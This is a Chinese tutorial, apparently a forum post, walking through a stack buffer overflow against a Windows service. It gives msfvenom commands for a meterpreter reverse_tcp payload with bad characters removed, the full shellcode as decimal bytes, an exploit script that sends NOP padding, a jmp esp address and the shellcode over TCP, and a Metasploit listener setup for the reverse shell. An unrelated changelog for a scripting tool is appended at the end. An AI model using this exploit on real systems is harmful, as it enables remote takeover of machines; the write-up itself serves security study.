`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows -b 00`
![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010629er6366akga20r3te.jpg)
这个就是没有00了，那么我们可以改一下我们的代码：

但是我们还是没有考虑到所有不被允许的字节，这里通过将所有字节传输过去（可以挨个试，但是一般是一次性发送到255），最终发现0d这个字节也是不被允许的，所以最终我们生成的shellcode应该这么写：`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows -b 00 0d`

但是单纯的python的shellcode格式是不行的，我们需要转换成10进制，并且整理，最终整理的结果：

`189,202,146,107,146,218,197,217,116,36,244,95,49,201,177,86,131,199,4,49,111,15,3,111,197,112,158,110,49,246,97,143,193,151,232,106,240,151,143,255,162,39,219,82,78,195,137,70,197,161,5,104,110,15,112,71,111,60,64,198,243,63,149,40,202,143,232,41,11,237,1,123,196,121,183,108,97,55,4,6,57,217,12,251,137,216,61,170,130,130,157,76,71,191,151,86,132,250,110,236,126,112,113,36,79,121,222,9,96,136,30,77,70,115,85,167,181,14,110,124,196,212,251,103,110,158,92,76,143,115,58,7,131,56,72,79,135,191,157,251,179,52,32,44,50,14,7,232,31,212,38,169,197,187,87,169,166,100,242,161,74,112,143,235,2,181,162,19,210,209,181,96,224,126,110,239,72,246,168,232,217,16,75,38,97,112,181,199,145,88,114,147,193,242,83,156,138,2,91,73,38,9,203,178,30,220,133,91,92,223,155,1,233,57,203,101,185,149,172,213,121,70,69,60,118,185,117,63,93,210,28,208,11,138,136,73,22,64,40,149,141,44,106,29,39,208,37,214,66,194,82,129,172,26,163,36,172,112,167,238,251,236,165,215,203,178,86,50,72,180,169,195,120,206,156,81,196,184,224,181,196,56,183,223,196,80,111,132,151,69,112,17,132,213,229,154,252,138,174,242,2,244,153,92,253,211,153,155,1,161,181,3,105,89,134,179,105,51,6,228,1,200,41,11,225,49,224,68,105,187,101,38,8,188,175,230,148,189,92,51,39,199,45,196,200,56,36,161,201,56,72,215,246,238,113,173,57,51,198,190,12,22,111,85,110,4,111,124`

```javascript
function main(args)
{
        s = CreateTCPSocket("192.168.209.130",8888);
        wb = TCPSocketRecv(s);
        print(wb);
        b = AddBytes(GetSomeBytes("144",16),GetBytes("227,65,75,95"));
        bt = AddBytes(b,GetSomeBytes("144",6));
        bw = AddBytes(bt,GetBytes("189,202,146,107,146,218,197,217,116,36,244,95,49,201,177,86,131,199,4,49,111,15,3,111,197,112,158,110,49,246,97,143,193,151,232,106,240,151,143,255,162,39,219,82,78,195,137,70,197,161,5,104,110,15,112,71,111,60,64,198,243,63,149,40,202,143,232,41,11,237,1,123,196,121,183,108,97,55,4,6,57,217,12,251,137,216,61,170,130,130,157,76,71,191,151,86,132,250,110,236,126,112,113,36,79,121,222,9,96,136,30,77,70,115,85,167,181,14,110,124,196,212,251,103,110,158,92,76,143,115,58,7,131,56,72,79,135,191,157,251,179,52,32,44,50,14,7,232,31,212,38,169,197,187,87,169,166,100,242,161,74,112,143,235,2,181,162,19,210,209,181,96,224,126,110,239,72,246,168,232,217,16,75,38,97,112,181,199,145,88,114,147,193,242,83,156,138,2,91,73,38,9,203,178,30,220,133,91,92,223,155,1,233,57,203,101,185,149,172,213,121,70,69,60,118,185,117,63,93,210,28,208,11,138,136,73,22,64,40,149,141,44,106,29,39,208,37,214,66,194,82,129,172,26,163,36,172,112,167,238,251,236,165,215,203,178,86,50,72,180,169,195,120,206,156,81,196,184,224,181,196,56,183,223,196,80,111,132,151,69,112,17,132,213,229,154,252,138,174,242,2,244,153,92,253,211,153,155,1,161,181,3,105,89,134,179,105,51,6,228,1,200,41,11,225,49,224,68,105,187,101,38,8,188,175,230,148,189,92,51,39,199,45,196,200,56,36,161,201,56,72,215,246,238,113,173,57,51,198,190,12,22,111,85,110,4,111,124"));
        TCPSocketSend(s,bw);
        wb = TCPSocketRecv(s);
        print(wb);
        CloseTCPSocket(s);
}
```



那么这个144是做什么的，其实就是怕不是第一个字符开始执行有点差错的话呢那么我们的程序就会终止，那么我们可以加几个NOP进行填充，这样保证我们的程序可以正确无误的执行。
我们大部分的工作完成了，但是还存在一个问题，那个OOOO到底要写成什么，我们肯定不能写成ESP的地址，那么怎么办？这个时候我们只能间接的进行实现了。
反正我们只要让EIP运行到ESP的位置，那么我们为什么不能找一个地址，这个地址存储的汇编代码是可以跳转到ESP的呢？
例如：`jmp esp`,`ret`,`jnz/jz/je/jne esp`，寻找这个样子的代码，第一个明显是最简单的，第二个的话呢我们还是需要构造一下，好让他能返回到ESP，第三个的话呢我们还需要考虑标志寄存器的一个问题（其实还有好多，这里我就举了这几个）。
所以我们现在就要找一个这个程序里面哪个地方存在`jmp esp`这条语句，我们只需要将OOOO设置为这个地址，然后EIP运行到这里的时候，然后他就会跳转到ESP。
我们首先要确定我们找到的这个地址他是不会改变的地址（ASLR），第二就是这个地址里面不能存在00，第三就是这个地址没有被SEH链保护，第四还要这个地址要是系统的DLL。
确定这一点之后，我们就要来查一下，这个DBG有个mona插件，可以网上下载，他支持查看：`!mona modules`:
![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010632he6vv6ewlk9aq6vk.jpg)
OD也有类似的插件。
我们尽量保证除了OS DLL这个选项是true，其他的选项都是FALSE，我们最终发现了`SLMFC.dll`，那么我们就在这个DLL中寻找`jmp esp`。
其实如果主程序的地址不是00开头的话呢应该也是可以用的，但是很可惜一般不太可能。
那么我们来寻找一下，使用命令：`!mona find -s "\xff\xe4" -m "SLMFC.dll"`
最后得到：
![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010634vfnlnaaklfzfx6wl.jpg)
`jmp esp`对应的就是ff e4。
最后找到了这么多，随便选一个：`0x5f4b41e3`
我们尝试一下，但是我们用的时候注意，我们这个地址是要能够执行的，如果不是的话呢要确保你的DEP是关闭的（上面说过了）。
还需要注意的是，我们内存的存储方式，需要反过来，也就是说我们要这样写：`\xe3\x41\x4b\x5f`，当然也是需要转换成十进制。
代码写好之后我们就需要配置我们的msf进行侦听：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.209.138
set LPORT 666
exploit -j
```

最终我们的结果会是这个样子：

![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010636uzvpkcalois60f66.jpg)

最终我们成功的溢出了目标系统。

## V1.27

1. 增加了socket支持库
2. 修复了其余目录加载问题
3. 增加了n多脚本
4. 增加了Windows的wker脚本默认执行

## V1.28
1. 新增选中右键直接运行
2. 脚本搜索功能
3. 脚本增加至200多个

## V1.29
1. 修复了socket支持库读取阻塞问题
2. 增加了强行关闭运行功能

## V1.30

1. 修复了对象引用出错
2. 增加SSH支持库
3. 增加了FTP支持库
4. 增加了MySQL支持库
5. 增加了GBK的Http读取
6. 增加了Http的Safe版本
7. 增加了N多脚本

## V1.31

1. 增加了许多脚本，整理了脚本目录
2. 增加了插件
3. 增加全局数组的导入
4. 增加列举
5. 分离了新版本变化和使用指导

## V1.32
1. 增加了try catch块
2. 增加设置全局变量的运行时函数
3. 增加了time支持库
4. 增加了fofa和钟馗的脚本

## V1.33
1. 增加了几个支持库
2. 修改了漏洞探测脚本